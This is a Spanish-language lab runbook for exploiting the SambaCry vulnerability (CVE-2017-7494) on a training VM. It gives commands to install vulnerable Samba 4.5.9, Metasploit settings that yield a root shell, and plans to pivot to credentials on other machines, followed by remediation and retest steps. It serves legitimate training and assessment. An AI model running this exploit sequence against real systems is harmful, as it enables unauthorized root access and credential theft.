# B1 · SambaCry · CVE-2017-7494

## 1. Ficha

| Campo | Valor |
|---|---|
| VM | M3 `10.10.10.13` |
| Servicio | Samba |
| Versión actual | **4.5.10** (fix) |
| Versión a instalar | **4.5.9** |
| Rango vulnerable | 3.5.0–4.6.3 · 4.5.0–4.5.9 · 4.4.0–4.4.13 |
| Versión que corrige | **4.6.4 / 4.5.10 / 4.4.14** |
| CVSS | **9.8** v3.1 |
| CWE | CWE-94 |
| NVD | https://nvd.nist.gov/vuln/detail/CVE-2017-7494 |
| Artefacto | `artifacts/vulnerable/samba-4.5.9.tar.gz` |
| Estado | **Válida con cambio**: instalar 4.5.9 |

## 2. Precondiciones

- Samba 4.5.9 compilado en `/usr/local/samba`.
- Recurso `[backups]` escribible (invitado o usuario).
- SMB1/SMB2 alcanzable desde M1/pivote.
- `smbd --version` = 4.5.9.

## 3. Flujo

1. Snapshot M3: `previo-a-B1`.
2. Instalar 4.5.9 desde el artefacto (si aún no está):

```bash
# En M3
cd ~/artifacts
tar xzf vulnerable/samba-4.5.9.tar.gz
cd samba-4.5.9
./configure --prefix=/usr/local/samba --without-ad-dc --disable-avahi \
  --without-systemd --without-ldap --without-ads --without-winbind --without-acl-support
make -j"$(nproc)" && sudo make install
sudo /usr/local/samba/sbin/smbd --version
```

3. Verificar el recurso:

```bash
smbclient -L //10.10.10.13 -N
smbclient //10.10.10.13/backups -N -c 'ls'
```

4. Explotar con Metasploit (desde M6 o vía pivote):

```text
use exploit/linux/samba/is_known_pipename
set RHOSTS 10.10.10.13
set SMB_SHARE_NAME backups
set PAYLOAD cmd/unix/interact
run
id
```

5. Alternativa manual: subir una librería al share y forzar la carga con el pipe; usar el módulo de MSF es más simple y evidencia el CVE.

## 4. Resultado esperado

```text
[*] 10.10.10.13:445 - Exploit triggered...
uid=0(root) gid=0(root) groups=0(root)
```

## 5. Evidencia

- `EV-B1-01`: `smbd --version` 4.5.9.
- `EV-B1-02`: `smbclient` al share.
- `EV-B1-03`: shell root.
- `LOG-B1`.

## 6. Impacto y siguiente salto

- Shell root en M3.
- Acceso a backups y credenciales → M4/M5.

## 7. Fallback

- Si 4.5.9 no compila, usar **B5** (SSH débil) como tercera vuln de M3.
- Si el share no es escribible, corregir la configuración del recurso.

## 8. Remediación

- Samba **4.5.10+** (o 4.6.4+).
- SMB1 off; `server min protocol = SMB2`.
- Recurso no invitado; permisos mínimos.

## 9. Retest

```bash
smbd --version
smbclient -L //10.10.10.13 -N
nmap -sT --script smb-vuln* -p 445 10.10.10.13
```

Esperado: 4.5.10+, sin shell, script limpio.

## 10. EARS

- **REQ-B1-01 (Estado).** MIENTRAS se use Samba para B1, el laboratorio DEBE tener 4.5.9, no 4.5.10.
- **REQ-B1-02 (Evento).** CUANDO se explote B1, el laboratorio DEBE capturar `uid=0(root)`.
- **REQ-B1-03 (Ubicuo).** La remediación DEBE dejar Samba 4.5.10+ y el PoC DEBE fallar.

## 11. Checklist

- [ ] Snapshot `previo-a-B1`.
- [ ] Samba 4.5.9 instalado.
- [ ] Share escribible.
- [ ] Shell root.
- [ ] Evidencia.
- [ ] Remediación 4.5.10.
- [ ] Retest.
